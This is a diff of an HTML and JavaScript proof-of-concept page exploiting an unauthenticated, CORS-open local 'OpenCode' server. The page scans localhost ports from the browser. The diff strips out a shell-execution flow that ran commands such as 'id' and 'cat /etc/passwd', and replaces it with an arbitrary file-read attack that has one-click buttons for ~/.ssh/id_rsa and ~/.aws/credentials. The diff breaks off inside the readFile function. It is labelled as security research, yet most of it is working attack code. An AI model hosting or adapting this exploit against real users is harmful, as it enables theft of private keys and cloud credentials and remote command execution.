@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OpenCode RCE Vulnerability PoC</title>
+    <title>OpenCode File Read Vulnerability PoC</title>
     <style>
         * {
             box-sizing: border-box;
@@ -168,30 +168,8 @@
         .output .error {
             color: #f85149;
         }
-        .output .info {
+        .output .info-text {
             color: #58a6ff;
-            background: transparent;
-            border: none;
-            padding: 0;
-            margin: 0;
-        }
-        .sessions {
-            margin-top: 15px;
-        }
-        .session-item {
-            background: #21262d;
-            border: 1px solid #30363d;
-            border-radius: 4px;
-            padding: 8px 12px;
-            margin-bottom: 8px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        .session-item:hover {
-            background: #30363d;
-        }
-        .session-item.selected {
-            border-color: #58a6ff;
         }
         .hidden {
             display: none;
@@ -207,33 +185,32 @@
 </head>
 <body>
     <div class="container">
-        <h1>OpenCode RCE Vulnerability PoC</h1>
+        <h1>OpenCode File Read Vulnerability PoC</h1>
         
         <div class="warning">
             <h2>Security Research Demonstration</h2>
-            <p>This page demonstrates CVE-like vulnerabilities in OpenCode's client-server architecture:</p>
+            <p>This page demonstrates a vulnerability in OpenCode's client-server architecture:</p>
             <ul style="margin: 10px 0 0 20px;">
                 <li><strong>No CORS validation</strong> - Any website can make requests</li>
                 <li><strong>No authentication</strong> - No tokens or credentials required</li>
-                <li><strong>Arbitrary shell execution</strong> - via POST /session/:id/shell</li>
+                <li><strong>Arbitrary file read</strong> - via GET /file/content?path=...</li>
             </ul>
         </div>
 
         <div class="info">
             <h3>How This Works</h3>
             <ul>
-                <li>OpenCode server binds to <code>127.0.0.1</code> on a random port</li>
+                <li>OpenCode server binds to <code>127.0.0.1</code> on an ephemeral port (49152-65535)</li>
                 <li>The server uses <code>.use(cors())</code> with no origin restrictions</li>
                 <li>This allows any website to scan localhost ports and find the server</li>
-                <li>Once found, we can create sessions and execute arbitrary commands</li>
-                <li>File: <code>/packages/opencode/src/server/server.ts:135</code></li>
+                <li>Once found, we can read arbitrary files from the filesystem</li>
             </ul>
         </div>
 
         <div class="controls">
             <h3>Step 1: Find OpenCode Server</h3>
             <div class="port-scan">
-                <input type="number" id="portStart" value="3000" min="1" max="65535" placeholder="Start Port">
+                <input type="number" id="portStart" value="49152" min="1" max="65535" placeholder="Start Port">
                 <input type="number" id="portEnd" value="65535" min="1" max="65535" placeholder="End Port">
                 <button onclick="scanPorts()">Scan Ports</button>
             </div>
@@ -241,55 +218,34 @@
             
             <div class="form-group">
                 <label>Or enter known port:</label>
-                <input type="number" id="knownPort" placeholder="e.g., 3000">
+                <input type="number" id="knownPort" placeholder="e.g., 52000">
                 <button onclick="checkPort()" style="margin-top: 10px;">Check Port</button>
             </div>
         </div>
 
-        <div id="exploitSection" class="controls hidden">
-            <h3>Step 2: Select Session</h3>
-            <div id="sessionStatus" class="status hidden"></div>
-            <div id="sessionsList" class="sessions"></div>
-            <button onclick="createSession()" style="margin-top: 10px;">Create New Session</button>
-        </div>
-
-        <div id="shellSection" class="controls hidden">
-            <h3>Step 3: Execute Commands</h3>
-            <div class="form-group">
-                <label>Command to execute:</label>
-                <input type="text" id="command" placeholder="whoami" value="whoami">
-            </div>
-            <div class="flex-row">
-                <button onclick="executeCommand()">Execute</button>
-                <button onclick="executeCommand('id')" class="danger">Run: id</button>
-                <button onclick="executeCommand('cat /etc/passwd')" class="danger">Run: cat /etc/passwd</button>
-            </div>
-            <div style="margin-top: 15px;">
-                <h4 style="color: #8b949e; margin-bottom: 10px;">Output:</h4>
-                <div id="output" class="output"><span class="info">// Command output will appear here</span></div>
-            </div>
-        </div>
-
-        <div class="controls" style="margin-top: 20px;">
-            <h3>File Read (Alternative Attack Vector)</h3>
+        <div id="fileSection" class="controls hidden">
+            <h3>Step 2: Read Files</h3>
             <div class="form-group">
                 <label>File path to read:</label>
                 <input type="text" id="filePath" placeholder="/etc/passwd" value="/etc/passwd">
             </div>
-            <button onclick="readFile()" id="readFileBtn" disabled>Read File</button>
+            <div class="flex-row">
+                <button onclick="readFile()">Read File</button>
+                <button onclick="readFile('~/.ssh/id_rsa')" class="danger">~/.ssh/id_rsa</button>
+                <button onclick="readFile('~/.aws/credentials')" class="danger">~/.aws/credentials</button>
+            </div>
             <div style="margin-top: 15px;">
-                <div id="fileOutput" class="output hidden"></div>
+                <div id="fileOutput" class="output"><span class="info-text">// File contents will appear here</span></div>
             </div>
         </div>
     </div>
 
     <script>
         let serverPort = null;
-        let selectedSession = null;
 
         async function tryPort(port) {
             const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 500);
+            const timeout = setTimeout(() => controller.abort(), 300);
             
             try {
                 const response = await fetch(`http://127.0.0.1:${port}/session`, {
@@ -300,7 +256,7 @@
                 
                 if (response.ok) {
                     const data = await response.json();
-                    // Check if it looks like OpenCode
+                    // Check if it looks like OpenCode (returns array of sessions)
                     if (Array.isArray(data)) {
                         return { port, sessions: data };
                     }
@@ -313,7 +269,7 @@
         }
 
         async function scanPorts() {
-            const start = parseInt(document.getElementById('portStart').value) || 3000;
+            const start = parseInt(document.getElementById('portStart').value) || 49152;
             const end = parseInt(document.getElementById('portEnd').value) || 65535;
             const status = document.getElementById('scanStatus');
             
@@ -322,7 +278,7 @@
             status.textContent = `Scanning ports ${start}-${end}...`;
 
             // Scan in batches for performance
-            const batchSize = 100;
+            const batchSize = 200;
             
             for (let i = start; i <= end; i += batchSize) {
                 const batch = [];
@@ -338,8 +294,8 @@
                 if (found) {
                     serverPort = found.port;
                     status.className = 'status found';
-                    status.textContent = `Found OpenCode server on port ${found.port}! (${found.sessions.length} sessions)`;
-                    showExploitSection(found.sessions);
+                    status.textContent = `Found OpenCode server on port ${found.port}!`;
+                    document.getElementById('fileSection').classList.remove('hidden');
                     return;
                 }
             }
@@ -365,130 +321,19 @@
             if (result) {
                 serverPort = result.port;
                 status.className = 'status found';
-                status.textContent = `Found OpenCode server on port ${port}! (${result.sessions.length} sessions)`;
-                showExploitSection(result.sessions);
+                status.textContent = `Found OpenCode server on port ${port}!`;
+                document.getElementById('fileSection').classList.remove('hidden');
             } else {
                 status.className = 'status error';
                 status.textContent = `No OpenCode server found on port ${port}`;
             }
         }
 
-        function showExploitSection(sessions) {
-            document.getElementById('exploitSection').classList.remove('hidden');
-            document.getElementById('readFileBtn').disabled = false;
-            
-            const list = document.getElementById('sessionsList');
-            list.innerHTML = '';
-            
-            if (sessions.length === 0) {
-                list.innerHTML = '<p style="color: #8b949e;">No sessions found. Create one to continue.</p>';
-                return;
-            }
-            
-            sessions.forEach(session => {
-                const div = document.createElement('div');
-                div.className = 'session-item';
-                div.textContent = `Session: ${session.id} (${session.title || 'Untitled'})`;
-                div.onclick = () => selectSession(session.id, div);
-                list.appendChild(div);
-            });
-        }
-
-        function selectSession(sessionId, element) {
-            selectedSession = sessionId;
-            
-            document.querySelectorAll('.session-item').forEach(el => {
-                el.classList.remove('selected');
-            });
-            element.classList.add('selected');
-            
-            document.getElementById('shellSection').classList.remove('hidden');
-            
-            const status = document.getElementById('sessionStatus');
-            status.className = 'status found';
-            status.classList.remove('hidden');
-            status.textContent = `Selected session: ${sessionId}`;
-        }
-
-        async function createSession() {
-            const status = document.getElementById('sessionStatus');
-            status.className = 'status scanning';
-            status.classList.remove('hidden');
-            status.textContent = 'Creating new session...';
-
-            try {
-                const response = await fetch(`http://127.0.0.1:${serverPort}/session`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({})
-                });
-                
-                const session = await response.json();
-                selectedSession = session.id;
-                
-                status.className = 'status found';
-                status.textContent = `Created session: ${session.id}`;
-                
-                document.getElementById('shellSection').classList.remove('hidden');
-                
-                // Refresh sessions list
-                const sessionsResponse = await fetch(`http://127.0.0.1:${serverPort}/session`);
-                const sessions = await sessionsResponse.json();
-                showExploitSection(sessions);
-                
-            } catch (e) {
-                status.className = 'status error';
-                status.textContent = `Error creating session: ${e.message}`;
-            }
-        }
-
-        async function executeCommand(cmd) {
-            const command = cmd || document.getElementById('command').value;
-            const output = document.getElementById('output');
-            
-            if (!selectedSession) {
-                output.innerHTML = '<span class="error">Error: No session selected</span>';
-                return;
-            }
-
-            output.innerHTML += `\n<span class="prompt">$ ${command}</span>\n`;
-
-            try {
-                const response = await fetch(`http://127.0.0.1:${serverPort}/session/${selectedSession}/shell`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        command: command,
-                        agent: 'default'
-                    })
-                });
-
-                const data = await response.json();
-                
-                if (data.parts && data.parts.length > 0) {
-                    const part = data.parts[0];
-                    if (part.state && part.state.output) {
-                        output.innerHTML += `<span class="result">${escapeHtml(part.state.output)}</span>\n`;
-                    } else if (part.state && part.state.error) {
-                        output.innerHTML += `<span class="error">${escapeHtml(part.state.error)}</span>\n`;
-                    }
-                } else {
-                    output.innerHTML += `<span class="info">${JSON.stringify(data, null, 2)}</span>\n`;
-                }
-                
-                output.scrollTop = output.scrollHeight;
-                
-            } catch (e) {
-                output.innerHTML += `<span class="error">Error: ${e.message}</span>\n`;
-            }
-        }
-
-        async function readFile() {
-            const filePath = document.getElementById('filePath').value;
+        async function readFile(path) {
+            const filePath = path || document.getElementById('filePath').value;
             const output = document.getElementById('fileOutput');
             
-            output.classList.remove('hidden');
-            output.innerHTML = `<span class="info">Reading ${filePath}...</span>`;
+            output.innerHTML = `<span class="info-text">Reading ${filePath}...</span>`;
 
             try {
                 const response = await fetch(`http://127.0.0.1:${serverPort}/file/content?path=${encodeURIComponent(filePath)}`);
